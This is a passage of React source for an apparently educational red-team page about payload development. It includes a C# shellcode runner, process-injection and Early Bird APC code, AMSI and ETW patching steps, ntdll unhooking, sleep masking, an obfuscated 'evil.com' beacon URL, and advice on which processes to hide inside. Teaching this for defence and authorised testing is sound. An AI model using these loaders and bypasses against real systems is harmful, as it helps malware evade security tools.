    static extern uint WaitForSingleObject(
        IntPtr hHandle, 
        uint dwMilliseconds);

    public static void Main()
    {
        // Your shellcode goes here (from msfvenom)
        byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83... };

        // Step 1: Allocate executable memory (RWX)
        // MEM_COMMIT | MEM_RESERVE = 0x3000
        // PAGE_EXECUTE_READWRITE = 0x40
        IntPtr addr = VirtualAlloc(
            IntPtr.Zero, 
            (uint)shellcode.Length, 
            0x3000,  // MEM_COMMIT | MEM_RESERVE
            0x40);   // PAGE_EXECUTE_READWRITE

        // Step 2: Copy shellcode to allocated memory
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        // Step 3: Create thread starting at shellcode address
        IntPtr hThread = CreateThread(
            IntPtr.Zero, 0, addr, 
            IntPtr.Zero, 0, IntPtr.Zero);

        // Step 4: Wait for shellcode to finish
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}`}
                </Typography>
              </Paper>
              <Alert severity="warning" sx={{ borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Why This Gets Detected</AlertTitle>
                This basic pattern is heavily signatured. VirtualAlloc with RWX, followed by copying bytes, followed by
                CreateThread pointing to that memory = instant detection by any modern AV/EDR. We use this only for learning—
                real payloads need obfuscation, indirect calls, and evasion techniques.
              </Alert>
            </Box>

            <Alert severity="info" sx={{ borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>The Memory Protection Dance</AlertTitle>
              Modern defenses watch for RWX (Read-Write-Execute) memory. A better approach: allocate as RW, write 
              shellcode, then change to RX using VirtualProtect. EDRs still catch this, but it's one layer of evasion.
            </Alert>
          </Paper>

          {/* Payload Types Section */}
          <Paper id="payload-types" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <LayersIcon sx={{ color: accent }} />
              Payload Types & Staging
            </Typography>

            <Grid container spacing={3} sx={{ mb: 3 }}>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#dc2626", 0.08), border: `1px solid ${alpha("#dc2626", 0.2)}`, height: "100%" }}>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#dc2626", mb: 2 }}>Staged Payloads</Typography>
                  <Typography variant="body2" component="div" sx={{ lineHeight: 1.8 }}>
                    <strong>How it works:</strong><br/>
                    Small "stager" downloads larger payload<br/><br/>

                    <strong>Pros:</strong><br/>
                    • Small initial size (bypasses size limits)<br/>
                    • Payload not on disk<br/>
                    • Can update payload without new stager<br/><br/>

                    <strong>Cons:</strong><br/>
                    • Network callback required<br/>
                    • Download can be detected/blocked<br/>
                    • Two-stage = two chances for detection
                  </Typography>
                </Paper>
              </Grid>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#22c55e", 0.08), border: `1px solid ${alpha("#22c55e", 0.2)}`, height: "100%" }}>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#22c55e", mb: 2 }}>Stageless Payloads</Typography>
                  <Typography variant="body2" component="div" sx={{ lineHeight: 1.8 }}>
                    <strong>How it works:</strong><br/>
                    Complete payload in single package<br/><br/>

                    <strong>Pros:</strong><br/>
                    • No network dependency for execution<br/>
                    • Single detection opportunity<br/>
                    • Works in air-gapped environments<br/><br/>

                    <strong>Cons:</strong><br/>
                    • Larger size (harder to inject)<br/>
                    • More content to scan/detect<br/>
                    • Must regenerate for changes
                  </Typography>
                </Paper>
              </Grid>
            </Grid>

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Common Payload Architectures</Typography>
            <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 3 }}>
              <Table>
                <TableHead>
                  <TableRow sx={{ bgcolor: alpha(accent, 0.08) }}>
                    <TableCell sx={{ fontWeight: 700 }}>Type</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Use Case</TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {[
                    { type: "Reverse Shell", desc: "Connect back to attacker with command shell", use: "Initial access, simple C2" },
                    { type: "Bind Shell", desc: "Open port for attacker to connect", use: "When outbound blocked" },
                    { type: "Meterpreter", desc: "Advanced, extensible Metasploit agent", use: "Post-exploitation, pivoting" },
                    { type: "Beacon", desc: "Cobalt Strike's asynchronous agent", use: "Professional red team ops" },
                    { type: "Custom Agent", desc: "Purpose-built C2 implant", use: "Evading specific defenses" },
                  ].map((row) => (
                    <TableRow key={row.type}>
                      <TableCell sx={{ fontWeight: 600 }}>{row.type}</TableCell>
                      <TableCell>{row.desc}</TableCell>
                      <TableCell>{row.use}</TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>
          </Paper>

          {/* Obfuscation Section */}
          <Paper id="obfuscation" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <VisibilityOffIcon sx={{ color: accent }} />
              Obfuscation Techniques
            </Typography>
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              Obfuscation transforms code to evade static analysis while preserving functionality. It's your first
              line of defense against signature-based detection.
            </Typography>

            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "String Encryption", desc: "Encrypt strings, decrypt at runtime. Hides URLs, commands, API names.", color: "#dc2626" },
                { name: "Control Flow Obfuscation", desc: "Add fake branches, opaque predicates, flatten control flow.", color: "#f59e0b" },
                { name: "API Hashing", desc: "Replace function name strings with hashes resolved at runtime.", color: "#3b82f6" },
                { name: "Code Encryption", desc: "Encrypt payload body, decrypt stub unpacks at runtime.", color: "#22c55e" },
                { name: "Junk Code Insertion", desc: "Add NOPs, dead code, meaningless operations.", color: "#8b5cf6" },
                { name: "Variable Renaming", desc: "Replace meaningful names with random strings.", color: "#ec4899" },
              ].map((tech) => (
                <Grid item xs={12} md={6} key={tech.name}>
                  <Paper sx={{ p: 2.5, borderRadius: 2, bgcolor: alpha(tech.color, 0.08), border: `1px solid ${alpha(tech.color, 0.2)}`, height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: tech.color }}>{tech.name}</Typography>
                    <Typography variant="body2" color="text.secondary">{tech.desc}</Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>

            <Box sx={{ bgcolor: alpha("#3b82f6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#3b82f6" }}>
                String Encryption Example (C#)
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: "#1a1a2e", fontFamily: "monospace" }}>
                <Typography variant="body2" sx={{ color: "#f8f8f2" }} component="pre">
{`// Before: Easily detected string
string url = "http://evil.com/beacon";

// After: Encrypted and decrypted at runtime
byte[] encrypted = { 0x4a, 0x2b, 0x1c... }; // XOR encrypted
byte[] key = { 0x41, 0x42, 0x43, 0x44 };
string url = Decrypt(encrypted, key);

// AV sees random bytes, not the URL
// Only at runtime does the string exist in memory`}
                </Typography>
              </Paper>
            </Box>
          </Paper>

          {/* Process Injection Section */}
          <Paper id="process-injection" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <AccountTreeIcon sx={{ color: accent }} />
              Process Injection Techniques
            </Typography>
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              Process injection executes malicious code within legitimate processes, inheriting their trust and evading
              process-based detection. It's a cornerstone technique for advanced payloads.
            </Typography>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                Beginner's Guide: Why Inject Into Other Processes?
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Problem 1 - Your Process is Suspicious:</strong><br/>
                If you drop malicious.exe and run it, every security product scrutinizes this unknown process.
                But if your code runs inside explorer.exe or svchost.exe—trusted Windows processes—it inherits that trust.<br/><br/>

                <strong>Problem 2 - Process-Based Detection:</strong><br/>
                EDRs track per-process: what files it opens, what network connections it makes. By migrating to another
                process, you start fresh without the suspicious history.<br/><br/>

                <strong>Analogy - Wearing a Disguise:</strong><br/>
                You're a spy trying to enter a secure building. You could sneak in (your suspicious process),
                or put on a janitor's uniform (inject into a trusted process) and walk right in!
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#dc2626", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#dc2626" }}>
                Classic Injection Flow (Heavily Detected!)
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9, mb: 2 }}>
                This is the pattern all injection techniques build upon. Understand it, but know it's instantly detected:
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`// Classic Process Injection - Every EDR knows this pattern!

// Step 1: Get handle to target process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
// Now we can manipulate notepad.exe's memory

// Step 2: Allocate memory in the target
LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, shellcodeSize,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
// remoteAddr points to empty memory in notepad.exe

// Step 3: Write shellcode to allocated memory  
WriteProcessMemory(hProcess, remoteAddr, shellcode, shellcodeSize, NULL);
// Shellcode is now in notepad.exe's memory!

// Step 4: Execute the shellcode
CreateRemoteThread(hProcess, NULL, 0, 
    (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
// Shellcode executes inside notepad.exe!

// WHY THIS IS DETECTED:
// OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
// = The most signatured pattern in existence. INSTANT ALERT.`}
                </Typography>
              </Paper>
              <Alert severity="warning" sx={{ borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Every EDR Has Rules For This</AlertTitle>
                This exact API sequence is detection rule #1 in every security product. Modern techniques must disguise
                or avoid this pattern entirely.
              </Alert>
            </Box>

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Modern Injection Techniques</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "Process Hollowing", desc: "Create suspended process, unmap its code entirely, replace with your payload, resume. The process looks legitimate from outside but runs your code.", detection: "High" },
                { name: "Module Stomping", desc: "Find a rarely-used DLL in the target, overwrite its .text section with shellcode. Code appears to come from a legitimate DLL.", detection: "Medium" },
                { name: "APC Injection", desc: "Queue an Asynchronous Procedure Call to a thread. Executes when thread enters alertable state. No new threads created!", detection: "Medium" },
                { name: "Thread Hijacking", desc: "Suspend existing thread, modify its instruction pointer (RIP) to your shellcode, resume. Hijacks existing execution flow.", detection: "Medium" },
                { name: "Early Bird", desc: "Create process suspended → inject → resume. Payload runs BEFORE the target's code, before EDR can hook!", detection: "Lower" },
                { name: "Process Doppelgänging", desc: "Use NTFS transactions: create transacted file, map as image, rollback. File never actually exists on disk!", detection: "Lower" },
              ].map((tech) => (
                <Grid item xs={12} md={6} key={tech.name}>
                  <Paper sx={{ p: 2.5, borderRadius: 2, bgcolor: alpha(accent, 0.05), height: "100%" }}>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: accent }}>{tech.name}</Typography>
                      <Chip 
                        label={`Detection: ${tech.detection}`} 
                        size="small"
                        sx={{
                          bgcolor: tech.detection === "High" ? alpha("#dc2626", 0.2) :
                                   tech.detection === "Medium" ? alpha("#f59e0b", 0.2) :
                                   alpha("#22c55e", 0.2),
                          color: tech.detection === "High" ? "#dc2626" :
                                 tech.detection === "Medium" ? "#f59e0b" :
                                 "#22c55e"
                        }}
                      />
                    </Box>
                    <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.7 }}>{tech.desc}</Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>

            <Box sx={{ bgcolor: alpha("#8b5cf6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#8b5cf6" }}>
                Early Bird Injection - Running Before EDR Hooks
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9, mb: 2 }}>
                The key insight: EDR hooks are typically installed when a process starts. If you inject BEFORE the process
                fully initializes, you can run before EDR instrumentation!
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`// Early Bird Injection Concept:

// 1. Create target process SUSPENDED (it doesn't run yet)
CreateProcess("C:\\Windows\\System32\\notepad.exe",
    NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED,  // KEY: Process created but not running!
    NULL, NULL, &si, &pi);

// 2. Allocate and write shellcode (same as classic)
VirtualAllocEx(pi.hProcess, ...);
WriteProcessMemory(pi.hProcess, ...);

// 3. Queue APC (not CreateRemoteThread!)
QueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, NULL);

// 4. Resume the process
ResumeThread(pi.hThread);

// RESULT: APC fires BEFORE notepad.exe's main() runs!
// Your shellcode executes before EDR can fully instrument the process.`}
                </Typography>
              </Paper>
            </Box>

            <Box sx={{ bgcolor: alpha("#f59e0b", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#f59e0b" }}>
                Target Process Selection Strategy
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>svchost.exe:</strong> Many instances, runs as SYSTEM. But every EDR has detailed rules for 
                svchost behavior. Each instance runs specific services—wrong behavior = instant alert.<br/><br/>

                <strong>explorer.exe:</strong> User context, legitimately makes network connections. Good for C2.
                But only one instance per session—crash it and user notices immediately.<br/><br/>

                <strong>RuntimeBroker.exe:</strong> Multiple instances, network activity, user privileges. 
                Increasingly monitored but still good choice.<br/><br/>

                <strong>Best Practice:</strong> Match your payload's behavior to the target. Network C2? Browser process.
                File access? Document viewer. Blend in with legitimate activity!
              </Typography>
            </Box>

            <Alert severity="warning" sx={{ borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>Target Process Selection</AlertTitle>
              Choose injection targets carefully. svchost.exe and explorer.exe blend in but are heavily monitored.
              Consider less obvious processes that match your payload's expected behavior (e.g., a process that
              legitimately makes network connections).
            </Alert>
          </Paper>

          {/* AMSI Bypass Section */}
          <Paper id="amsi-bypass" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <LockOpenIcon sx={{ color: accent }} />
              AMSI Bypass Techniques
            </Typography>
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              AMSI (Antimalware Scan Interface) allows applications to request malware scans, particularly affecting
              PowerShell, JScript, VBScript, and .NET. Bypassing AMSI is essential for script-based attacks.
            </Typography>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                Beginner's Guide: What is AMSI?
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>The Problem AMSI Solves:</strong><br/>
                Attackers discovered that if malware runs entirely in memory using scripts (PowerShell, VBScript), 
                traditional file-scanning AV couldn't see it. The malicious code never touched the disk!<br/><br/>

                <strong>Microsoft's Solution - AMSI:</strong><br/>
                AMSI is a "tollbooth" that sits between the script engine (PowerShell) and execution. Every script
                is sent to AMSI, which then asks your AV "is this malicious?" before allowing it to run.<br/><br/>

                <strong>Real-World Analogy:</strong><br/>
                Imagine airport security. Even if you sneak weapons past the first checkpoint (file scanning), AMSI is
                like a second security check right before you board the plane (execute code). It scans your intent.
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#f59e0b", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#f59e0b" }}>
                How AMSI Works - Step by Step
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>1.</strong> You type a PowerShell command or run a script<br/>
                <strong>2.</strong> PowerShell loads amsi.dll into its process<br/>
                <strong>3.</strong> Before executing, PowerShell calls AmsiScanBuffer() with your script content<br/>
                <strong>4.</strong> AMSI sends the content to registered AV providers (Defender, etc.)<br/>
                <strong>5.</strong> AV analyzes and returns: AMSI_RESULT_CLEAN or AMSI_RESULT_DETECTED<br/>
                <strong>6.</strong> If detected, PowerShell blocks execution and shows an error<br/><br/>

                <strong>Bypass Strategy:</strong> Break ANY step in this chain and AMSI fails!
              </Typography>
            </Box>

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Common Bypass Techniques</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "AmsiScanBuffer Patch", desc: "Overwrite the first bytes of AmsiScanBuffer() to immediately return 'clean'. Most common bypass." },
                { name: "amsiInitFailed Forceing", desc: "Set the internal amsiInitFailed flag to true. AMSI thinks it failed to load and skips scanning." },
                { name: "Reflection Bypass", desc: "Use .NET reflection to access and modify AMSI's internal state without direct API calls." },
                { name: "Hardware Breakpoints", desc: "Use CPU debug registers to intercept AmsiScanBuffer and modify return values." },
                { name: "Unhooking amsi.dll", desc: "Read fresh amsi.dll from disk, overwrite the hooked/patched copy in memory." },
                { name: "String Obfuscation", desc: "Obfuscate script content to avoid triggering AMSI signature matches." },
              ].map((tech) => (
                <Grid item xs={12} md={6} key={tech.name}>
                  <Paper sx={{ p: 2.5, borderRadius: 2, bgcolor: alpha(accent, 0.05) }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: accent }}>{tech.name}</Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.7 }}>{tech.desc}</Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>

            <Box sx={{ bgcolor: alpha("#8b5cf6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#8b5cf6" }}>
                Classic AMSI Bypass (PowerShell)
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9, mb: 2 }}>
                This is the foundational technique. It patches AmsiScanBuffer to always return success:
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`# EDUCATIONAL EXAMPLE - This exact code is heavily signatured!
# Real bypasses require obfuscation

# The concept: Patch AmsiScanBuffer to return immediately
# Before: Function does actual scanning
# After: Function just returns "clean" without scanning

# Simplified pseudocode of what happens:
# 1. Get handle to amsi.dll in current process
# 2. Find address of AmsiScanBuffer function  
# 3. Change memory protection to allow writing
# 4. Overwrite first bytes with: mov eax, 0x80070057; ret
#    (This makes it return E_INVALIDARG = "nothing to scan")
# 5. Restore memory protection
# 6. Now all AMSI scans return "clean"!

# Why 0x80070057?
# This is E_INVALIDARG - "invalid argument passed"
# AMSI interprets this as "nothing bad found"
# The scanner never actually runs!`}
                </Typography>
              </Paper>
              <Alert severity="warning" sx={{ borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Detection Consideration</AlertTitle>
                All known AMSI bypass techniques are signatured by Defender. The bypass attempt itself can trigger detection!
                You need to obfuscate the bypass code too, or use novel techniques.
              </Alert>
            </Box>

            <Box sx={{ bgcolor: alpha("#dc2626", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#dc2626" }}>
                Modern AMSI Bypass Strategy
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Layer 1 - Obfuscate the Bypass:</strong><br/>
                The bypass code itself must be obfuscated. String concatenation, encoding, indirect API calls.<br/><br/>

                <strong>Layer 2 - Execute Early:</strong><br/>
                Run the bypass as the very first thing, before any monitored code.<br/><br/>

                <strong>Layer 3 - Combine with Other Techniques:</strong><br/>
                Use reflection instead of direct API calls. Access internal .NET fields to disable AMSI context.<br/><br/>

                <strong>Layer 4 - Consider ETW:</strong><br/>
                Even with AMSI bypassed, ETW (Event Tracing for Windows) may still log your script. Consider patching 
                EtwEventWrite as well for complete stealth.
              </Typography>
            </Box>

            <Alert severity="info" sx={{ borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>AMSI Scope</AlertTitle>
              AMSI is per-process. Bypassing it in one PowerShell instance doesn't affect others. Also, some applications
              don't use AMSI (older .NET Framework apps), so the bypass may not always be necessary. Know your target.
            </Alert>
          </Paper>

          {/* EDR Evasion Section */}
          <Paper id="edr-evasion" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <RadarIcon sx={{ color: accent }} />
              EDR Evasion Techniques
            </Typography>
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              Modern EDRs use multiple detection layers. Effective evasion requires addressing API hooks, behavioral
              analysis, memory scanning, and telemetry collection simultaneously.
            </Typography>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                Beginner's Guide: The EDR Evasion Mindset
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Think Like a CCTV System Operator:</strong><br/>
                EDRs are like a building's security system with cameras everywhere. They're watching:<br/>
                • Every door you open (API calls)<br/>
                • Every room you enter (process access)<br/>
                • Your patterns over time (behavioral analysis)<br/>
                • What you're carrying (memory contents)<br/><br/>

                <strong>Evasion Strategies:</strong><br/>
                • <strong>Avoid the cameras:</strong> Use techniques that don't trigger logging (direct syscalls)<br/>
                • <strong>Blind the cameras:</strong> Disable or confuse monitoring (unhooking, ETW patching)<br/>
                • <strong>Look normal:</strong> Behave like legitimate software (blend in)<br/>
                • <strong>Move when they're not looking:</strong> Act during sleep, use timing tricks
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#dc2626", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#dc2626" }}>
                Unhooking: Removing EDR Instrumentation
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9, mb: 2 }}>
                EDRs place inline hooks at the start of ntdll.dll functions. When your code calls an API, it first
                goes through the EDR's hook. Unhooking restores the original code:
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`// Unhooking Concept (Pseudocode):

// 1. Read clean ntdll.dll from disk
HANDLE hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", ...);
// This file hasn't been modified - it's the original!

// 2. Map it into memory  
HANDLE hMapping = CreateFileMapping(hFile, ...);
LPVOID cleanNtdll = MapViewOfFile(hMapping, ...);

// 3. Find the .text section (code section)
// Parse PE headers to locate .text section in both copies:
// - cleanNtdll: The untouched version from disk
// - loadedNtdll: The version EDR has hooked in memory

// 4. Overwrite hooked version with clean version
VirtualProtect(loadedNtdll_text, size, PAGE_EXECUTE_READWRITE, &old);
memcpy(loadedNtdll_text, cleanNtdll_text, textSectionSize);
VirtualProtect(loadedNtdll_text, size, old, &temp);

// Now all ntdll.dll functions are "clean" again!
// EDR hooks have been removed from this process.`}
                </Typography>
              </Paper>
              <Alert severity="warning" sx={{ borderRadius: 2, mb: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>EDR Counter-Measures</AlertTitle>
                EDRs detect unhooking via: reading ntdll.dll from disk (suspicious!), VirtualProtect on ntdll memory,
                kernel callbacks that notice when hooks are removed, and periodic re-checking of their hooks.
              </Alert>
            </Box>

            <Box sx={{ bgcolor: alpha("#8b5cf6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#8b5cf6" }}>
                Sleep Obfuscation / Sleep Masking
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9, mb: 2 }}>
                <strong>The Problem:</strong><br/>
                Your implant (beacon) sleeps between C2 callbacks. During sleep, EDR memory scanners search for
                known shellcode patterns. Your payload is sitting in memory, exposed!<br/><br/>

                <strong>The Solution - Sleep Masking:</strong><br/>
                Encrypt the payload in memory before sleeping. EDR scans find only encrypted garbage, not shellcode.
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`// Sleep Masking Workflow:

// BEFORE SLEEP:
1. Generate random encryption key
2. Encrypt all payload memory with XOR/AES
3. Change memory permissions: RWX → RW (or no access)
   // Now it's not executable and looks like random data!
4. Queue a timer or callback to wake up

// DURING SLEEP:
// Memory scanners see only: encrypted garbage, non-executable
// Pattern matching fails, heuristics see nothing suspicious

// AFTER SLEEP (timer/callback fires):
1. Decrypt the payload memory
2. Change permissions back: RW → RX
3. Continue execution

// Popular implementations:
// - Cobalt Strike's sleep_mask BOF
// - Ekko: Uses ROP + timers for obfuscation
// - Foliage: Advanced sleep masking technique`}
                </Typography>
              </Paper>
            </Box>

            <Box sx={{ bgcolor: alpha("#f59e0b", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#f59e0b" }}>
                ETW (Event Tracing for Windows) Patching
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9, mb: 2 }}>
                <strong>The Problem:</strong><br/>
                Even if you bypass all user-mode hooks, Windows itself logs events via ETW. EDRs subscribe to ETW
                providers and receive detailed telemetry about your actions.<br/><br/>

                <strong>The Solution:</strong><br/>
                Patch EtwEventWrite to prevent events from being logged.
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`// ETW Patching Concept:

// ntdll!EtwEventWrite - the function that sends ETW events
// Patch it to return immediately without logging

// Similar to AMSI bypass:
// 1. Get address of EtwEventWrite in ntdll.dll
// 2. Change memory protection to RWX
// 3. Overwrite first bytes with: ret (0xC3)
// 4. Restore memory protection

// Now ETW events silently disappear!
// EDR loses visibility into process/thread events.

// CAUTION: 
// - Some critical Windows functions depend on ETW
// - May cause instability if too aggressive
// - Kernel-level ETW still works!`}
                </Typography>
              </Paper>
            </Box>

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Advanced Evasion Techniques</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "Stack Spoofing", desc: "Forge a fake call stack that looks like legitimate code execution. EDRs analyze stacks to detect suspicious call origins.", color: "#dc2626" },
                { name: "Return Address Spoofing", desc: "Manipulate return addresses so that when analyzed, your shellcode appears to have been called from a legitimate location.", color: "#f59e0b" },
                { name: "Heap Encryption", desc: "Encrypt strings, config data, and other artifacts on the heap. Prevents memory forensics from finding IoCs.", color: "#3b82f6" },
                { name: "PPID Spoofing", desc: "Make your process appear to have a different parent. powershell.exe spawned by explorer.exe looks normal; from cmd.exe looks suspicious.", color: "#22c55e" },
                { name: "Callback Execution", desc: "Instead of CreateThread, use Windows callbacks (EnumWindows, CertEnumSystemStore, etc.) to execute code. Harder to trace.", color: "#8b5cf6" },
                { name: "Thread Stack Stomping", desc: "Overwrite your thread's call stack before sleep to hide execution history from memory forensics.", color: "#ec4899" },
              ].map((tech) => (
                <Grid item xs={12} md={6} key={tech.name}>
                  <Paper sx={{ p: 2.5, borderRadius: 2, bgcolor: alpha(tech.color, 0.08), border: `1px solid ${alpha(tech.color, 0.2)}` }}>
